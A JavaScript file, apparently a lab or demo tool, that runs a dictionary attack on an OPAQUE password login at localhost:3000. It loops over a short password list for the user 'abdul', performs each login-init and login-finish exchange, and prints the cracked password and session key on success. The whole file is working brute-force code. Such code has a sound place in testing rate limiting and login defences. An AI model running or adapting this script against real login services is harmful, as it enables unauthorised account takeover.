// attack.js - The Brute Force Bot
import fs from 'fs';
import path from 'path';
import fetch from 'node-fetch'; 

// Import the library directly
import init, { Login } from './node_modules/@47ng/opaque-client/opaque-client.js';

// --- CONFIGURATION ---
const TARGET_URL = 'http://localhost:3000';
const TARGET_USER = 'abdul'; 

const PASSWORD_DICTIONARY = [
    '123456',
    'password',
    'admin123',
    'letmein',
    'football',
    'sunbro26', 
    'dragon',
    'supersecret'
];

// --- HELPERS ---
const binToJson = (u8) => Array.from(u8);
const jsonToBin = (arr) => new Uint8Array(arr);
const toHex = (u8) => Buffer.from(u8).toString('hex');
const strToBytes = (str) => new Uint8Array(Buffer.from(str, 'utf-8')); // New Helper

// --- WASM LOADER ---
async function loadWasm() {
    try {
        const wasmPath = path.resolve('./node_modules/@47ng/opaque-client/opaque-client_bg.wasm');
        const wasmBuffer = fs.readFileSync(wasmPath);
        await init(wasmBuffer);
    } catch (e) {
        console.error("CRITICAL: Could not load WASM file.", e);
        process.exit(1);
    }
}

// --- ATTACK LOGIC ---
async function tryPassword(password) {
    process.stdout.write(`[*] Trying password: "${password}" ... `);

    try {
        const login = new Login();
        const request = login.start(password);

        // 1. Send Init
        const res1 = await fetch(`${TARGET_URL}/login-init`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                userId: TARGET_USER, 
                startUploadArray: binToJson(request) 
            })
        });

        const data1 = await res1.json();

        if (data1.error) {
            console.log(`❌ Server Error: ${data1.error}`);
            login.free();
            return false;
        }

        const serverResponse = jsonToBin(data1.serverResponseArray);
        
        // FIX: Convert Target User to Bytes
        const userBytes = strToBytes(TARGET_USER);

        // 2. Attempt Decrypt (The Check)
        let output;
        try {
            // FIX: Pass userBytes as 3rd argument (matches main.js)
            output = login.finish(password, serverResponse, userBytes);
        } catch (cryptoError) {
            console.log(`❌ Failed (Wrong Password)`);
            login.free();
            return false;
        }

        // 3. Prove it
        // Handle object return from finish()
        let clientFinish = output.message || output;
        
        const res2 = await fetch(`${TARGET_URL}/login-finish`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                userId: TARGET_USER, 
                clientFinishArray: binToJson(clientFinish) 
            })
        });

        const result = await res2.json();
        
        if (result.success) {
            console.log(`\n\n🎉 SUCCESS! PASSWORD CRACKED! 🎉`);
            console.log(`-------------------------------------`);
            console.log(`User: ${TARGET_USER}`);
            console.log(`Pass: ${password}`);
            console.log(`Session Key: ${toHex(jsonToBin(result.sessionKeyArray))}`);
            console.log(`-------------------------------------`);
            login.free();
            return true; 
        }

    } catch (e) {
        console.log(`⚠️ Network Error: ${e.message}`);
    }
    
    return false;
}

async function runAttack() {
    await loadWasm();

    console.log(`\n=== STARTING DICTIONARY ATTACK ON: ${TARGET_USER} ===\n`);
    
    for (const password of PASSWORD_DICTIONARY) {
        const success = await tryPassword(password);
        if (success) {
            process.exit(0); 
        }
        await new Promise(r => setTimeout(r, 50)); 
    }
    
    console.log("\n❌ ATTACK FINISHED: Password not in dictionary.");
}

runAttack();